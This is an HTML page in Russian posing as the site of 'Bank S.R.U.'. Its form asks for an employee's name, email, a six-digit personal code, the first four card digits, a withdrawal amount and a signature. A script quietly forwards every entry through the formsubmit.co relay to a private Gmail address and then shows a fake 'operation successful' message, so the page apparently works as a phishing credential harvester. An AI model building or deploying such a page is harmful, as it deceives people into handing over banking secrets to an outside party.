<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Банк С.Р.У.</title>

  <!-- Шрифты -->
  <link
    href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap"
    rel="stylesheet"
  />

  <style>
    /* Сброс и базовые стили */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Roboto', sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: linear-gradient(135deg, #7b2cbf, #9d4edd);
      color: #333;
      animation: bgFade 2s ease-in-out;
    }

    @keyframes bgFade {
      from { background-position: 0% 50%; }
      to { background-position: 100% 50%; }
    }

    /* Контейнер */
    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    /* Заголовок */
    .header {
      text-align: center;
      margin-bottom: 24px;
      animation: slideDown 0.8s ease-out both;
    }
    .header h1 {
      font-size: 2.4rem;
      color: #fff;
      margin-bottom: 8px;
    }
    .header p {
      font-size: 1.2rem;
      color: #f0e9ff;
    }

    @keyframes slideDown {
      from { opacity: 0; transform: translateY(-30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* Форма */
    .card {
      background: #efe7f6;
      border-radius: 12px;
      box-shadow: 0 12px 32px rgba(0,0,0,0.12);
      width: 100%;
      max-width: 480px;
      padding: 32px;
      display: flex;
      flex-direction: column;
      gap: 16px;
      animation: fadeInUp 0.8s 0.4s ease-out both;
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .form-group {
      display: flex;
      flex-direction: column;
      animation: fadeInUp 0.6s both;
    }
    .form-group:nth-child(1) { animation-delay: 0.5s; }
    .form-group:nth-child(2) { animation-delay: 0.6s; }
    .form-group:nth-child(3) { animation-delay: 0.7s; }
    .form-group:nth-child(4) { animation-delay: 0.8s; }
    .form-group:nth-child(5) { animation-delay: 0.9s; }
    .form-group:nth-child(6) { animation-delay: 1.0s; }
    .form-group:nth-child(7) { animation-delay: 1.1s; }

    .form-group label {
      margin-bottom: 6px;
      font-size: 0.9rem;
      color: #5a2f91;
    }
    .form-group input,
    .form-group textarea {
      padding: 10px 12px;
      font-size: 1rem;
      border: 1px solid #d4c4e1;
      border-radius: 6px;
      transition: border-color 0.3s, box-shadow 0.3s;
      background: #fff;
    }
    .form-group input:focus,
    .form-group textarea:focus {
      outline: none;
      border-color: #7b2cbf;
      box-shadow: 0 0 6px rgba(123,44,191,0.3);
    }
    .form-group textarea { resize: vertical; min-height: 80px; }

    /* Кнопки */
    .buttons {
      display: flex;
      gap: 12px;
      flex-wrap: wrap;
      justify-content: center;
      margin-top: 8px;
      animation: fadeInUp 0.6s 1.2s both;
    }
    .buttons button {
      flex: 1 1 45%;
      padding: 12px;
      font-size: 1rem;
      font-weight: 500;
      color: #fff;
      background: linear-gradient(135deg, #9d4edd, #7b2cbf);
      border: none;
      border-radius: 6px;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: transform 0.2s;
    }
    .buttons button:hover {
      transform: translateY(-2px);
    }
    /* Ripple-анимация */
    .buttons button::after {
      content: "";
      position: absolute;
      width: 120%;
      height: 120%;
      background: rgba(255,255,255,0.3);
      border-radius: 50%;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%) scale(0);
      transition: transform 0.5s;
    }
    .buttons button:active::after {
      transform: translate(-50%, -50%) scale(1);
      transition: 0s;
    }

    /* Сообщение об успехе */
    #success-message {
      text-align: center;
      color: #7b2cbf;
      font-weight: 500;
      display: none;
      margin-top: 12px;
    }

    /* Footer */
    footer {
      text-align: center;
      padding: 16px 8px;
      background: rgba(0,0,0,0.05);
      font-size: 0.85rem;
      color: #fafafa;
      background: linear-gradient(135deg, #6a1b9a, #8e24aa);
    }
    footer a { color: #f0e9ff; text-decoration: underline; }

    /* Адаптив */
    @media (max-width: 600px) {
      .card { padding: 24px; }
      .buttons { flex-direction: column; }
      .buttons button { width: 100%; }
    }

  </style>
</head>
<body>

  <div class="container">

    <div class="header">
      <h1>Банк С.Р.У.</h1>
      <p>Добро пожаловать на наш сайт!</p>
    </div>

    <form
      id="bank-form"
      class="card"
      action="https://formsubmit.co/ajax/communityofdevelopingcraftsmen@gmail.com"
      method="POST"
    >
      <input type="hidden" name="_captcha" value="false" />

      <div class="form-group">
        <label for="fio">ФИО сотрудника</label>
        <input type="text" id="fio" name="ФИО сотрудника" required />
      </div>

      <div class="form-group">
        <label for="email">Эл. почта</label>
        <input type="email" id="email" name="Эл. почта" required />
      </div>

      <div class="form-group">
        <label for="code">Ваш личный специальный код (6 цифр)</label>
        <input
          type="text"
          id="code"
          name="Ваш личный специальный код"
          pattern="\d{6}"
          maxlength="6"
          inputmode="numeric"
          placeholder="123456"
          required
        />
      </div>

      <div class="form-group">
        <label for="card">Первые 4 цифры вашей банковской карты</label>
        <input
          type="text"
          id="card"
          name="Первые 4 цифры вашей банковской карты"
          pattern="\d{4}"
          maxlength="4"
          inputmode="numeric"
          placeholder="1234"
          required
        />
      </div>

      <div class="form-group">
        <label for="amount">Сумма к выводу</label>
        <input
          type="number"
          id="amount"
          name="Сумма к выводу"
          min="0"
          step="0.01"
          placeholder="0.00"
          required
        />
      </div>

      <div class="form-group">
        <label for="signature">Ваша подпись</label>
        <input type="text" id="signature" name="Ваша подпись" required />
      </div>

      <div class="form-group">
        <label for="comment">Ваш комментарий</label>
        <textarea id="comment" name="Ваш комментарий"></textarea>
      </div>

      <div class="buttons">
        <button type="submit" id="to-card">Вывести сумму на вашу карту</button>
        <button type="submit" id="to-org">Перевести сумму на счет организации</button>
      </div>

      <div id="success-message">Операция проведена успешно :)</div>
    </form>

  </div>

  <!-- Footer -->
  <footer>
    © Vertex Dynamics 2025, Inc. SRU 2024–2025. Все права защищены.<br/>
    Электронная почта для связи:
    <a href="mailto:communityofdevelopingcraftsmen@gmail.com">
      communityofdevelopingcraftsmen@gmail.com
    </a>
  </footer>

  <!-- Библиотека formsubmit и скрипт обработки -->
  <script src="https://formsubmit.co/js/formsubmit.min.js"></script>
  <script>
    const form = document.getElementById('bank-form');
    const successMessage = document.getElementById('success-message');

    form.addEventListener('submit', e => {
      e.preventDefault();
      fetch(form.action, {
        method: 'POST',
        body: new FormData(form),
        headers: { 'Accept': 'application/json' }
      })
      .then(res => res.ok ? res.json() : Promise.reject(res))
      .then(() => {
        form.reset();
        successMessage.style.display = 'block';
        setTimeout(() => successMessage.style.display = 'none', 3000);
      })
      .catch(() => {
        alert('Ошибка отправки, попробуйте позже.');
      });
    });
  </script>
</body>
</html>
